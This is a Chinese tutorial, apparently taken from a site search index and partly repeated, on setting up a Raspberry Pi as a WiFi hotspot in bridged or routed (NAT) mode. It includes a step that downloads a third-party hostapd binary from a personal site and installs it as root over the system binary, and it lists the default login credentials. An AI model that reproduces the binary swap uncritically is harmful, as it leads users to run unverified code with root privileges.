chipset)\u300b \u3002 \u597d\u4e86\uff0c\u4e0b\u9762\u6211\u5c06\u5b9e\u8df5\u7684\u8fc7\u7a0b\u8bb0\u5f55\u4e0b\u6765\u4f9b\u5927\u5bb6\u53c2\u8003\uff0c\u5f53\u7136 \u4e3b\u8981\u53c2\u8003\u4e86\u4e0a\u9762\u4e24\u7bc7\u6587\u7ae0 \uff0c\u8fd9\u91cc\u662f\u914d\u7f6e\u7684\u56de\u5fc6\uff0c\u6211\u5c3d\u91cf\u8bb0\u5f55\u8be6\u7ec6\uff0c\u9057\u6f0f\u4e4b\u5904\u671b\u6307\u51fa\u3002 1. \u5b89\u88c5\u7cfb\u7edf\uff08\u5982\u679c\u7cfb\u7edf\u5df2\u7ecf\u5b89\u88c5\u53ef\u4ee5\u8df3\u8fc7\u8fd9\u4e00\u6b65\uff09 1.1 \u5c3d\u91cf\u4f7f\u7528\u6700\u65b0\u7cfb\u7edf\uff0c\u9996\u5148\u4e0b\u8f7d \u5b98\u65b9\u6700\u65b0\u955c\u50cf \uff0c\u7136\u540e\u4f7f\u7528 Win32DiskImager \u70e7\u5f55\u5230SD\u5361\u4e0a\u3002\u6ce8\u610f\u8fd9\u91cc\u6211\u4eec\u9009\u7528\u7684\u662fRaspbian\u3002 1.2 Raspberry Pi\u8fde\u63a5\u4e0a\u65e0\u7ebf\u7f51\u5361\uff0c\u7136\u540e\u7cfb\u7edf\u955c\u50cf\u5237\u5165SD\u5361\u540e\uff0c\u6211\u4eec\u8fde\u63a5\u663e\u793a\u5668\u952e\u76d8\u548c\u9f20\u6807\u8fdb\u884c\u521d\u59cb\u5316\u914d\u7f6e\u5de5\u4f5c\uff0c\u5f53\u7136\u6ca1\u6709\u6761\u4ef6\u7684\u8bdd\u63a8\u8350\u76f4\u63a5\u4f7f\u7528SSH\u8fde\u63a5Raspberry Pi\uff0c\u8fd9\u6837\u66f4\u65b9\u4fbf\uff0c\u56e0\u4e3a\u65b0\u7cfb\u7edf\u9ed8\u8ba4\u5f00\u653e\u4e86SSH\u7ba1\u7406\u3002 \u8fde\u63a5\u4fe1\u606f\u4e3b\u8981\u5982\u4e0b\uff1a \u4e3b\u673a\u540d : raspberrypi \u7528\u6237\u540d : pi \u5bc6 \u7801 : raspberry \u5982\u679c\u4f60\u662f\u76f4\u63a5\u901a\u8fc7SSH\u8fde\u63a5\u5230Raspberry Pi\u7684\u8bdd\uff0c\u4e0b\u9762\u7684\u914d\u7f6e\u6b65\u9aa4\u662f\u5fc5\u8981\u7684\uff1a 1.2.1 \u521d\u59cb\u5316\u914d\u7f6e\uff0c\u4e0b\u9762\u7684\u914d\u7f6e\u53ea\u6709\u5728\u65b0\u5b89\u88c5\u7684\u7cfb\u7edf\u5185\u9700\u8981\uff0c\u4ec5\u505a\u4e00\u6b21\u3002 \u8fd0\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u8fdb\u5165\u914d\u7f6e\u754c\u9762\uff1a sudo raspi-config \u63a8\u8350\u66f4\u65b0\u4e0b\u9762\u7684\u914d\u7f6e\u9009\u9879\uff08 \u65b0\u914d\u7f6e\u754c\u9762 \uff09\uff1a 1 Expand Filesystem 2 Change User Password 4 Internationalisation Options I1 Change Locale I2 Change Timezone 8 Advanced Options A3 Memory Split A6 Update \uff08 \u65e7\u914d\u7f6e\u754c\u9762 \uff09 update expand_rootfs change_pass change_timezone memory_split \u8fd9\u91cc\u8981\u6ce8\u610f Memory Split/memory_split \uff0c\u9ed8\u8ba4\u9884\u7559\u7ed9\u56fe\u5f62\u754c\u9762\u7684\u662f 64MB \uff0c\u4f5c\u4e3a\u4e00\u53f0\u65e0\u7ebf\u8def\u7531\u57fa\u672c\u4e0a\u5c31\u7528\u4e0d\u5230\u56fe\u5f62\u754c\u9762\u4e86\uff0c\u5f88\u663e\u7136 64MB \u7565\u6709\u5962\u4f88\uff0c\u6211\u4eec\u5c06\u5176\u6539\u6210 32MB \u3002 \u6700\u540e Finish \u5b8c\u6210\u521d\u59cb\u5316\u914d\u7f6e\u3002\u7cfb\u7edf\u4f1a\u81ea\u52a8\u63d0\u793a\u91cd\u542f\uff0c\u5982\u679c\u6ca1\u6709\u6309\u9884\u671f\u91cd\u542f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u91cd\u542f\u7cfb\u7edf\uff1a sudo shutdown -r now 2. \u5b89\u88c5hotspot(hostapd) sudo apt-get install bridge-utils hostapd hostapd\u5b9e\u73b0\u7684\u662f\u65e0\u7ebf\u5171\u4eab\uff0c \u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\u5b98\u65b9\u63d0\u4f9b\u7684\u7a0b\u5e8f\u4e0d\u517c\u5bb9RTL8188CUS\u82af\u7247\u7684\u65e0\u7ebf\u7f51\u5361\uff0c\u4e0d\u8fc7Edimax\u56e2\u961f\u4e3a\u6211\u4eec\u4e13\u95e8\u7f16\u8bd1\u4e86\u517c\u5bb9\u7684\u7248\u672c\uff0c\u4e0b\u9762\u7684\u64cd\u4f5c\u9700\u8981\u66ff\u6362hostapd\u4e3a\u517c\u5bb9\u7248\u672c\u3002 \u66ff\u6362\u7684\u547d\u4ee4\u5982\u4e0b\uff1a wget http://www.daveconroy.com/wp3/wp-content/uploads/2013/07/hostapd.zip unzip hostapd.zip sudo mv /usr/sbin/hostapd /usr/sbin/hostapd.bak sudo mv hostapd /usr/sbin/hostapd.edimax sudo ln -sf /usr/sbin/hostapd.edimax /usr/sbin/hostapd sudo chown root.root /usr/sbin/hostapd sudo chmod 755 /usr/sbin/hostapd \u63a5\u4e0b\u6765\u63d0\u4f9b\u4e24\u79cd\u65b9\u6848\uff0c\u4e00\u79cd\u662f\u6865\u63a5\u65b9\u5f0f\u8bbe\u7f6e\u70ed\u70b9\uff0c\u6709\u70b9\u7c7b\u4f3c\u4ea4\u6362\u673a\u5de5\u4f5c\u539f\u7406\uff0c\u5c06\u7f51\u7ebf\u53e3\u7684\u4fe1\u53f7\u8f6c\u6362\u4e3a\u65e0\u7ebf\uff0c\u53e6\u5916\u4e00\u79cd\u5219\u662f\u8def\u7531\u65b9\u5f0f\u5b9e\u73b0\u65e0\u7ebf\u4e0a\u7f51\uff0c\u548c\u5927\u90e8\u5206\u8def\u7531\u5668\u5de5\u4f5c\u65b9\u5f0f\u4e00\u6837\u3002 3. \u6865\u63a5\u7684\u65b9\u5f0f\u8bbe\u7f6eWiFi\u70ed\u70b9\uff08\u65b9\u6848\u4e00\uff09 3.1 \u5b89\u88c5\u5fc5\u5907\u7a0b\u5e8f sudo apt-get install bridge-utils 3.2 \u914d\u7f6e\u7f51\u5361 \u7f16\u8f91\u7f51\u5361\u914d\u7f6e\u6587\u4ef6\uff1a sudo nano /etc/network/interfaces \u6ce8\u91ca\u6389\u6240\u6709\u7684\u5173\u4e8e\u65e0\u7ebf\u7f51\u5361\u7684\u90e8\u5206\uff0c\u6700\u540e\u5e94\u8be5\u53d8\u6210\u4e0b\u9762\u6240\u793a\uff1a #allow-hotplug wlan0 #wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf #iface default inet dhcp \u52a0\u4e0a\u4e0b\u9762\u8fd9\u6bb5\u6865\u63a5\u914d\u7f6e\uff1a auto br0 iface br0 inet dhcp bridge_ports eth0 wlan0 \u6700\u7ec8\u7684\u914d\u7f6e\u4e3b\u8981\u7531\u4ee5\u4e0b\u51e0\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a #loopback adapter auto lo iface lo inet loopback #wired adapter iface eth0 inet dhcp #bridge auto br0 iface br0 inet dhcp bridge_ports eth0 wlan0 3.3 \u914d\u7f6ehostapd sudo nano /etc/hostapd/hostapd.conf \u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a interface=wlan0 driver=rtl871xdrv bridge=br0 ssid=My_SSID_Name channel=1 wmm_enabled=0 wpa=1 wpa_passphrase=MYPASSWORD wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP auth_algs=1 macaddr_acl=0 \u914d\u7f6e\u6587\u4ef6\u5177\u4f53\u6211\u5c31\u4e0d\u8bf4\u4e86\uff0c\u60f3\u5fc5\u5927\u5bb6\u770b\u5185\u5bb9\u4e5f\u77e5\u9053\u5404\u9879\u7684\u542b\u4e49\uff0c\u4fdd\u5b58\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u3002 3.4 \u91cd\u542f\u5e76\u6d4b\u8bd5hostapd sudo reboot \u91cd\u542f\u5b8c\u6210\u540e\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6d4b\u8bd5\u662f\u5426\u6b63\u786e\uff1a sudo hostapd -dd /etc/hostapd/hostapd.conf \u5982\u679c\u6ca1\u6709\u9519\u8bef\u7684\u8bdd\uff0c\u4f60\u8fd9\u65f6\u5e94\u8be5\u80fd\u641c\u7d22\u5230\u4f60\u6240\u914d\u7f6e\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002\u7136\u540eCtrl+C\u9000\u51fa\u8fd9\u4e2a\u6d4b\u8bd5\u3002 \u5982\u679c\u4e00\u5207\u6b63\u5e38\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6ehostapd\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e86\u3002 sudo nano /etc/default/hostapd \u53bb\u6389\u6ce8\u91ca\u7b26\u53f7\u5e76\u6539\u52a8\u4e0b\u9762\u8fd9\u884c\u4e3a\u6211\u4eec\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" \u6865\u63a5\u65b9\u5f0f\u914d\u7f6e\u5b8c\u6210\uff01 4. \u8def\u7531\u7684\u65b9\u5f0f\u8bbe\u7f6eWiFi\u70ed\u70b9\uff08\u65b9\u6848\u4e8c\uff09 4.1 \u5b89\u88c5\u5fc5\u5907\u7a0b\u5e8f sudo apt-get install udhcpd udhcpd\u4e3b\u8981\u4e3a\u8fde\u63a5\u5230WiFi\u7684\u8bbe\u5907\u81ea\u52a8\u5206\u914dIP\u5730\u5740\u7684\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u6362\u7528\u4f60\u6240\u719f\u6089\u7684\u8f6f\u4ef6\u3002 4.2 \u914d\u7f6eudhcpd\uff0c\u7f16\u8f91 /etc/udhcpd.conf \uff0c\u4e3b\u8981\u5185\u5bb9\u5982\u4e0b\uff1a start 192.168.42.2 # This is the range of IPs that the hostspot will give to client devices. end 192.168.42.20 interface wlan0 # The device uDHCP listens on. remaining yes opt dns 8.8.8.8 4.2.2.2 # The DNS servers client devices will use. opt subnet 255.255.255.0 opt router 192.168.42.1 # The Pi's IP address on wlan0 which we will set up shortly. opt lease 864000 # 10 day DHCP lease time in seconds \u63a5\u4e0b\u6765\u7f16\u8f91 /etc/default/udhcpd \u5e76\u4e14\u5c06\u4e0b\u9762\u8fd9\u884c\u6ce8\u91ca\u6389\uff0c\u4ee5\u4f7fDHCP Server\u6b63\u5e38\u5de5\u4f5c\uff1a #DHCPD_ENABLED=\"no\" 4.3 \u914d\u7f6e\u65e0\u7ebf\u7f51\u5361 \u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u7ed9\u65e0\u7ebf\u7f51\u5361\u8bbe\u7f6e\u4e00\u4e2aIP\u5730\u5740\uff1a sudo ifconfig wlan0 192.168.42.1 \u5f53\u7136\u4e3a\u4e86\u4e0b\u6b21\u542f\u52a8\u4ecd\u7136\u6709\u6548\uff0c\u6211\u4eec\u9700\u8981\u914d\u7f6e /etc/network/interfaces \u6587\u4ef6\uff1a sudo nano /etc/network/interfaces \u6ce8\u91ca\u6389\u6240\u6709\u7684\u5173\u4e8e\u65e0\u7ebf\u7f51\u5361\u7684\u90e8\u5206\uff0c\u6700\u540e\u5e94\u8be5\u53d8\u6210\u4e0b\u9762\u6240\u793a\uff1a #wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf #iface default inet dhcp \u6ce8\u610f\u4fdd\u7559 allow-hotplug wlan0 \uff0c\u82f1\u6587\u539f\u6587\u662f\u4e0d\u4fdd\u7559\u7684\uff0c\u4f46\u662f\u6211\u64cd\u4f5c\u4e0b\u6765\u53d1\u73b0\u5982\u679c\u4e0d\u4fdd\u7559\u8fd9\u6bb5\u7684\u8bdd\uff0c\u65e0\u7ebf\u7f51\u5361\u6709\u65f6\u65e0\u6cd5\u6b63\u5e38\u914d\u7f6eIP\uff0c\u6700\u540e\u65e0\u7ebf\u7f51\u5361IP\u7684\u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a allow-hotplug wlan0 iface wlan0 inet static address 192.168.42.1 netmask 255.255.255.0 4.4 \u7f16\u8f91hostapd\u914d\u7f6e sudo nano /etc/hostapd/hostapd.conf \u5185\u5bb9\u5982\u4e0b\uff1a interface=wlan0 driver=rtl871xdrv ssid=My_SSID_Name hw_mode=g channel=6 macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=2 wpa_passphrase=MYPASSWORD wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP 4.7 \u542f\u52a8IP\u8f6c\u5411\u529f\u80fd\u4ee5\u4fbf\u4e8e\u5f00\u901aNAT sudo sh -c \"echo 1 > /proc/sys/net/ipv4/ip_forward\" \u7f16\u8f91 /etc/sysctl.conf \u6539\u52a8\u4e0b\u9762\u8fd9\u884c\uff1a net.ipv4.ip_forward=1 4.8 \u914d\u7f6eiptables\u9632\u706b\u5899 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT \u5230\u8fd9\u91cc\u8def\u7531\u7684NAT\u529f\u80fd\u5df2\u7ecf\u88ab\u542f\u7528\uff0c\u6211\u4eec\u5c06\u521a\u624d\u914d\u7f6e\u7684iptables\u4fdd\u5b58\u4e0b\u6765\u4ee5\u4fbf\u4e8e\u4e0b\u6b21\u4f7f\u7528\uff1a sudo sh -c \"iptables-save > /etc/iptables.ipv4.nat\" \u7f16\u8f91 /etc/network/interfaces \u7136\u540e\u5728\u6700\u540e\u52a0\u4e0a\u4e0b\u9762\u8fd9\u884c\u4ee5\u4f7f\u6bcf\u6b21\u542f\u52a8\u90fd\u81ea\u52a8\u52a0\u8f7diptables\u914d\u7f6e\uff1a up iptables-restore < /etc/iptables.ipv4.nat 4.9 \u91cd\u542f\u5e76\u6d4b\u8bd5hostapd sudo reboot \u91cd\u542f\u5b8c\u6210\u540e\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6d4b\u8bd5\u662f\u5426\u6b63\u786e\uff1a sudo hostapd -dd /etc/hostapd/hostapd.conf \u5982\u679c\u6ca1\u6709\u9519\u8bef\u7684\u8bdd\uff0c\u4f60\u8fd9\u65f6\u5e94\u8be5\u80fd\u641c\u7d22\u5230\u4f60\u6240\u914d\u7f6e\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002\u7136\u540eCtrl+C\u9000\u51fa\u8fd9\u4e2a\u6d4b\u8bd5\u3002 \u5982\u679c\u4e00\u5207\u6b63\u5e38\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6ehostapd\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e86\u3002 sudo nano /etc/default/hostapd \u53bb\u6389\u6ce8\u91ca\u7b26\u53f7\u5e76\u6539\u52a8\u4e0b\u9762\u8fd9\u884c\u4e3a\u6211\u4eec\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" 4.10 \u542f\u52a8\u76f8\u5e94\u8f6f\u4ef6\uff0c\u5e76\u52a0\u5165\u542f\u52a8\u9879 sudo service hostapd start sudo service udhcpd start sudo update-rc.d hostapd enable sudo update-rc.d udhcpd enable 2013\u5e7412\u670812\u65e5\u66f4\u65b0 \u6700\u8fd1\u7ecf\u5e38\u53d1\u73b0\u65e0\u7ebf\u7f51\u5361\u914d\u7f6e\u7684DHCP\u4e0d\u80fd\u53d1\u6325\u4f5c\u7528\uff0c\u7ecf\u8fc7\u6392\u67e5\u53d1\u73b0\u7ed9\u65e0\u7ebf\u7f51\u5361\u6307\u5b9a\u7684\u9759\u6001IP\u5931\u8d25\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u65e0\u7ebf\u7f51\u5361\u6ca1\u6709IP\u5bfc\u81f4DHCP\u65e0\u6cd5\u5de5\u4f5c\uff0c\u5728\u7f51\u4e0a\u627e\u5230\u8fd9\u7bc7\u6587\u7ae0 \u300aWhy won't dnsmasq's DHCP server work when using hostapd?\u300b \uff0c\u6839\u636e\u5185\u5bb9\u6211\u5c06 /etc/default/ifplugd \u7684\u5185\u5bb9\u4fee\u6539\u914d\u7f6e\u5982\u4e0b\uff1a INTERFACES=\"eth0\" HOTPLUG_INTERFACES=\"eth0\" ARGS=\"-q -f -u0 -d10 -w -I\" SUSPEND_ACTION=\"stop\" \u91cd\u542f\u4e86\u51e0\u6b21\u8fdb\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u4e00\u5207\u6b63\u5e38\uff01 \u539f\u6587\u94fe\u63a5\uff1a https://wangye.org/blog/archives/845/","title":"\u5c06\u6811\u8393\u6d3eRaspberry Pi\u8bbe\u7f6e\u4e3a\u65e0\u7ebf\u8def\u7531\u5668(WiFi\u70ed\u70b9AP,RTL8188CUS\u82af\u7247)"},{"location":"RPI/%E5%B0%86%E6%A0%91%E8%8E%93%E6%B4%BERaspberry%20Pi%E8%AE%BE%E7%BD%AE%E4%B8%BA%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%28WiFi%E7%83%AD%E7%82%B9AP%2CRTL8188CUS%E8%8A%AF%E7%89%87%29/#raspberry-piwifiaprtl8188cus","text":"\u63d0\u9192\uff1a \u672c\u9875\u9762\u5c06\u4e0d\u518d\u66f4\u65b0\u3001\u7ef4\u62a4\u6216\u8005\u652f\u6301\uff0c\u6587\u7ae0\u3001\u8bc4\u8bba\u6240\u53d9\u8ff0\u5185\u5bb9\u5b58\u5728\u65f6\u6548\u6027\uff0c\u6d89\u53ca\u6280\u672f\u7ec6\u8282\u6216\u8005\u8f6f\u4ef6\u4f7f\u7528\u65b9\u9762\u4e0d\u4fdd\u8bc1\u80fd\u591f\u5b8c\u5168\u6709\u6548\u53ef\u64cd\u4f5c\uff0c\u8bf7\u8c28\u614e\u53c2\u8003\uff01 \u6700\u8fd1\u53c8\u5f00\u59cb\u6298\u817e\u8d77Raspberry Pi\u6765\u4e86\uff0c\u56e0\u4e3a\u67d0\u5904\u4e0a\u7f51\u9700\u8981\u9510\u6377\u62e8\u53f7\uff0c\u4e8e\u662f\u6211\u5c31\u60f3\u80fd\u4e0d\u80fd\u8ba9\u6211\u7684\u6811\u8393\u6d3e\u4ee3\u52b3\uff0c\u5f53\u7136\u9996\u5148\u8981\u5c06\u5176\u6539\u9020\u4e3a\u8def\u7531\u5668\uff0c\u9ed8\u8ba4\u81ea\u5e26\u7684\u7f51\u53e3\u4f5c\u4e3aWAN\u53e3\uff0c\u6211\u4eec\u8fd8\u7f3a\u4e00\u4e2a\u7f51\u53e3\uff0c\u6728\u6709\u529e\u6cd5\uff0c\u53ea\u597d\u5360\u7528\u4e00\u4e2aUSB\u53e3\uff0c\u63a5\u4e0a\u4e00\u4e2aUSB\u7f51\u5361\uff0c\u7f51\u4e0a\u7684USB\u8f6cRJ45\u7f51\u7ebf\u53e3\u7684\u9002\u914d\u5668\u6bd4\u8f83\u5c11\uff0c\u4ef7\u683c\u4e5f\u4e0d\u4fbf\u5b9c\uff0c\u4e8e\u662f\u5c31\u8003\u8651\u5e72\u8106\u5c06\u5176\u6539\u9020\u6210\u65e0\u7ebf\u8def\u7531\uff0c\u4e5f\u7b26\u5408\u65f6\u4e0b\u9ad8\u7aef\u5927\u6c14\u4e0a\u6863\u6b21\u7684\u6807\u51c6\u3002 \u51c6\u5907\u5de5\u4f5c\uff0c\u5f53\u7136\u8981\u5148\u53bb\u8d2d\u4e70\u4e00\u4e2aUSB\u65e0\u7ebf\u7f51\u5361\uff0c\u53ef\u4ee5\u8d2d\u4e70\u7684\u578b\u53f7\u6bd4\u8f83\u591a\uff0cRaspberry Pi\u5b98\u65b9\u4e5f\u63d0\u4f9b\u4e86 \u517c\u5bb9\u6027\u5217\u8868 \u4f9b\u5927\u5bb6\u53c2\u8003\uff0c\u5177\u4f53\u731b\u51fb\u8fd9\u91cc\u3002\u6211\u8fd9\u91cc\u8d2d\u4e70\u7684\u662f \u7f51\u4ef6\uff08Netgear\uff09WNA1000M 150M\u8ff7\u4f60USB\u65e0\u7ebf\u7f51\u5361 \u3002 \u8f83\u4e3a\u5b98\u65b9\u7684\u4ecb\u7ecd\u914d\u7f6e\u4e3a\u65e0\u7ebf\u70ed\u70b9\u7684\u6587\u7ae0\u83ab\u8fc7\u4e8e\u8fd9\u4e00\u7bc7 \u300aRPI-Wireless-Hotspot\u300b \u3002\u4f46\u662f\u5b9e\u9645\u914d\u7f6e\u4e0b\u6765\u59cb\u7ec8\u65e0\u6cd5\u6210\u529f\u3002\u4f46\u662f\u65e0\u7ebf\u7f51\u5361\u786e\u5b9e\u80fd\u591f\u88ab\u8bc6\u522b\uff0c\u53ef\u4ee5\u901a\u8fc7 lsusb \u548c lsmod \u67e5\u770b\u5230\uff0c\u4e0d\u8fc7\u6211\u6ce8\u610f\u5230\u8fd9\u6b3e\u65e0\u7ebf\u7684\u82af\u7247\u578b\u53f7\u662fRealTek RTL8188CUS\uff0c\u521d\u6b65\u6000\u7591\u662f\u9a71\u52a8\u95ee\u9898\u3002 \u5f53\u7136\u770b\u5230\u522b\u4eba\u7684\u8001\u6b3e\u65e0\u7ebf\u7f51\u5361\u90fd\u914d\u7f6e\u6210\u529f\u4e86\u5fc3\u91cc\u96be\u514d\u75d2\u75d2\u7684\uff0c\u5f53\u7136\u4e5f\u4e0d\u80fd\u518d\u6d6a\u8d39\u94f6\u5b50\u53bb\u518d\u4e70\u4e2a\u7f51\u5361\uff0c\u4e8e\u662f\u53ea\u597d\u81ea\u5df1\u6478\u7d22\uff0c\u4e0d\u8fc7\u5929\u65e0\u7edd\u4eba\u4e4b\u8def\uff0c\u5728N\u6b21\u5237\u673a\u91cd\u88c5\u7cfb\u7edf\u540e\uff0c\u7ec8\u4e8e\u627e\u5230\u4e86\u6210\u529f\u7684\u529e\u6cd5\uff0c\u5176\u5b9e\u5173\u952e\u7684\u6587\u7ae0\u5c31\u5728\u4e0a\u9762\u90a3\u7bc7\u6587\u7ae0\u7684\u4e00\u4e2a\u94fe\u63a5\u4e2d \u300aTurn Your Raspberry Pi Into a WiFi Hotspot with Edimax Nano USB EW-7811Un (RTL8188CUS chipset)\u300b \u3002 \u597d\u4e86\uff0c\u4e0b\u9762\u6211\u5c06\u5b9e\u8df5\u7684\u8fc7\u7a0b\u8bb0\u5f55\u4e0b\u6765\u4f9b\u5927\u5bb6\u53c2\u8003\uff0c\u5f53\u7136 \u4e3b\u8981\u53c2\u8003\u4e86\u4e0a\u9762\u4e24\u7bc7\u6587\u7ae0 \uff0c\u8fd9\u91cc\u662f\u914d\u7f6e\u7684\u56de\u5fc6\uff0c\u6211\u5c3d\u91cf\u8bb0\u5f55\u8be6\u7ec6\uff0c\u9057\u6f0f\u4e4b\u5904\u671b\u6307\u51fa\u3002 1. \u5b89\u88c5\u7cfb\u7edf\uff08\u5982\u679c\u7cfb\u7edf\u5df2\u7ecf\u5b89\u88c5\u53ef\u4ee5\u8df3\u8fc7\u8fd9\u4e00\u6b65\uff09 1.1 \u5c3d\u91cf\u4f7f\u7528\u6700\u65b0\u7cfb\u7edf\uff0c\u9996\u5148\u4e0b\u8f7d \u5b98\u65b9\u6700\u65b0\u955c\u50cf \uff0c\u7136\u540e\u4f7f\u7528 Win32DiskImager \u70e7\u5f55\u5230SD\u5361\u4e0a\u3002\u6ce8\u610f\u8fd9\u91cc\u6211\u4eec\u9009\u7528\u7684\u662fRaspbian\u3002 1.2 Raspberry Pi\u8fde\u63a5\u4e0a\u65e0\u7ebf\u7f51\u5361\uff0c\u7136\u540e\u7cfb\u7edf\u955c\u50cf\u5237\u5165SD\u5361\u540e\uff0c\u6211\u4eec\u8fde\u63a5\u663e\u793a\u5668\u952e\u76d8\u548c\u9f20\u6807\u8fdb\u884c\u521d\u59cb\u5316\u914d\u7f6e\u5de5\u4f5c\uff0c\u5f53\u7136\u6ca1\u6709\u6761\u4ef6\u7684\u8bdd\u63a8\u8350\u76f4\u63a5\u4f7f\u7528SSH\u8fde\u63a5Raspberry Pi\uff0c\u8fd9\u6837\u66f4\u65b9\u4fbf\uff0c\u56e0\u4e3a\u65b0\u7cfb\u7edf\u9ed8\u8ba4\u5f00\u653e\u4e86SSH\u7ba1\u7406\u3002 \u8fde\u63a5\u4fe1\u606f\u4e3b\u8981\u5982\u4e0b\uff1a \u4e3b\u673a\u540d : raspberrypi \u7528\u6237\u540d : pi \u5bc6 \u7801 : raspberry \u5982\u679c\u4f60\u662f\u76f4\u63a5\u901a\u8fc7SSH\u8fde\u63a5\u5230Raspberry Pi\u7684\u8bdd\uff0c\u4e0b\u9762\u7684\u914d\u7f6e\u6b65\u9aa4\u662f\u5fc5\u8981\u7684\uff1a 1.2.1 \u521d\u59cb\u5316\u914d\u7f6e\uff0c\u4e0b\u9762\u7684\u914d\u7f6e\u53ea\u6709\u5728\u65b0\u5b89\u88c5\u7684\u7cfb\u7edf\u5185\u9700\u8981\uff0c\u4ec5\u505a\u4e00\u6b21\u3002 \u8fd0\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u8fdb\u5165\u914d\u7f6e\u754c\u9762\uff1a sudo raspi-config \u63a8\u8350\u66f4\u65b0\u4e0b\u9762\u7684\u914d\u7f6e\u9009\u9879\uff08 \u65b0\u914d\u7f6e\u754c\u9762 \uff09\uff1a 1 Expand Filesystem 2 Change User Password 4 Internationalisation Options I1 Change Locale I2 Change Timezone 8 Advanced Options A3 Memory Split A6 Update \uff08 \u65e7\u914d\u7f6e\u754c\u9762 \uff09 update expand_rootfs change_pass change_timezone memory_split \u8fd9\u91cc\u8981\u6ce8\u610f Memory Split/memory_split \uff0c\u9ed8\u8ba4\u9884\u7559\u7ed9\u56fe\u5f62\u754c\u9762\u7684\u662f 64MB \uff0c\u4f5c\u4e3a\u4e00\u53f0\u65e0\u7ebf\u8def\u7531\u57fa\u672c\u4e0a\u5c31\u7528\u4e0d\u5230\u56fe\u5f62\u754c\u9762\u4e86\uff0c\u5f88\u663e\u7136 64MB \u7565\u6709\u5962\u4f88\uff0c\u6211\u4eec\u5c06\u5176\u6539\u6210 32MB \u3002 \u6700\u540e Finish \u5b8c\u6210\u521d\u59cb\u5316\u914d\u7f6e\u3002\u7cfb\u7edf\u4f1a\u81ea\u52a8\u63d0\u793a\u91cd\u542f\uff0c\u5982\u679c\u6ca1\u6709\u6309\u9884\u671f\u91cd\u542f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u91cd\u542f\u7cfb\u7edf\uff1a sudo shutdown -r now 2. \u5b89\u88c5hotspot(hostapd) sudo apt-get install bridge-utils hostapd hostapd\u5b9e\u73b0\u7684\u662f\u65e0\u7ebf\u5171\u4eab\uff0c \u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\u5b98\u65b9\u63d0\u4f9b\u7684\u7a0b\u5e8f\u4e0d\u517c\u5bb9RTL8188CUS\u82af\u7247\u7684\u65e0\u7ebf\u7f51\u5361\uff0c\u4e0d\u8fc7Edimax\u56e2\u961f\u4e3a\u6211\u4eec\u4e13\u95e8\u7f16\u8bd1\u4e86\u517c\u5bb9\u7684\u7248\u672c\uff0c\u4e0b\u9762\u7684\u64cd\u4f5c\u9700\u8981\u66ff\u6362hostapd\u4e3a\u517c\u5bb9\u7248\u672c\u3002 \u66ff\u6362\u7684\u547d\u4ee4\u5982\u4e0b\uff1a wget http://www.daveconroy.com/wp3/wp-content/uploads/2013/07/hostapd.zip unzip hostapd.zip sudo mv /usr/sbin/hostapd /usr/sbin/hostapd.bak sudo mv hostapd /usr/sbin/hostapd.edimax sudo ln -sf /usr/sbin/hostapd.edimax /usr/sbin/hostapd sudo chown root.root /usr/sbin/hostapd sudo chmod 755 /usr/sbin/hostapd \u63a5\u4e0b\u6765\u63d0\u4f9b\u4e24\u79cd\u65b9\u6848\uff0c\u4e00\u79cd\u662f\u6865\u63a5\u65b9\u5f0f\u8bbe\u7f6e\u70ed\u70b9\uff0c\u6709\u70b9\u7c7b\u4f3c\u4ea4\u6362\u673a\u5de5\u4f5c\u539f\u7406\uff0c\u5c06\u7f51\u7ebf\u53e3\u7684\u4fe1\u53f7\u8f6c\u6362\u4e3a\u65e0\u7ebf\uff0c\u53e6\u5916\u4e00\u79cd\u5219\u662f\u8def\u7531\u65b9\u5f0f\u5b9e\u73b0\u65e0\u7ebf\u4e0a\u7f51\uff0c\u548c\u5927\u90e8\u5206\u8def\u7531\u5668\u5de5\u4f5c\u65b9\u5f0f\u4e00\u6837\u3002 3. \u6865\u63a5\u7684\u65b9\u5f0f\u8bbe\u7f6eWiFi\u70ed\u70b9\uff08\u65b9\u6848\u4e00\uff09 3.1 \u5b89\u88c5\u5fc5\u5907\u7a0b\u5e8f sudo apt-get install bridge-utils 3.2 \u914d\u7f6e\u7f51\u5361 